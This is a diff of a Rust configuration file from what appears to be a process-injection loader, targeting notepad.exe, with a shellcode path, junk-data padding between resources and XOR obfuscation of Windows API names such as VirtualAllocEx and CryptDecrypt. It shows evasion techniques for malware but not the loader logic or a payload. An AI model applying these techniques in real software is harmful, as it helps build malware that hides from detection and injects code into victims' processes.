@@ -2,16 +2,28 @@ const RESOURCE_ID: u32 = 100;
 const RESOURCE_NAME: &'static str = "resource.bin";
 
 const TARGET_PROCESS: &'static str = "notepad.exe";
-const SHELLCODE_PATH: &'static str = "build_src/shellcode64.bin";
+const SHELLCODE_PATH: &'static str = "";
+const DLL_PATH: &'static str = r"";
 
 //range for random byte generation. Will generate random amount of junk data between resource entries.
 const RANGE_START: usize = 0;
 const RANGE_END: usize = 0x100;
 
-//This is the key that the hashing algorithm will use to hash DLL and function names.
-const HASH_KEY: u32 = 13;
-
-static AES_STRINGS: [&str; 19] = [
+static XOR_STRINGS: [&str; 33] = [
+    "LoadLibraryA",
+    "CryptAcquireContextW",
+    "CryptCreateHash",
+    "CryptHashData",
+    "CryptDeriveKey",
+    "CryptDecrypt",
+    "CryptReleaseContext",
+    "CryptSetKeyParam",
+    "CryptGetKeyParam",
+    "CryptDestroyHash",
+    "CryptDestroyKey",
+    "ADVAPI32.dll",
+    "KERNEL32.DLL",
+    "NTDLL.dll",
     "VirtualAlloc",
     "VirtualAllocEx",
     "VirtualProtect",
@@ -31,24 +43,6 @@ static AES_STRINGS: [&str; 19] = [
     "NtFlushInstructionCache",
     "USER32.dll",
     "GetCurrentProcess",
-];
-
-static XOR_STRINGS: [&str; 14] = [
-    "LoadLibraryA",
-    "CryptAcquireContextW",
-    "CryptCreateHash",
-    "CryptHashData",
-    "CryptDeriveKey",
-    "CryptDecrypt",
-    "CryptReleaseContext",
-    "CryptSetKeyParam",
-    "CryptGetKeyParam",
-    "CryptDestroyHash",
-    "CryptDestroyKey",
-    "ADVAPI32.dll",
-    "KERNEL32.DLL",
-    "NTDLL.dll",
-    //"NtFlushInstructionCache",
 ];
 
 // Will try to automate the configs stuff, later. At the moment, doesn't work with 'cargo build'
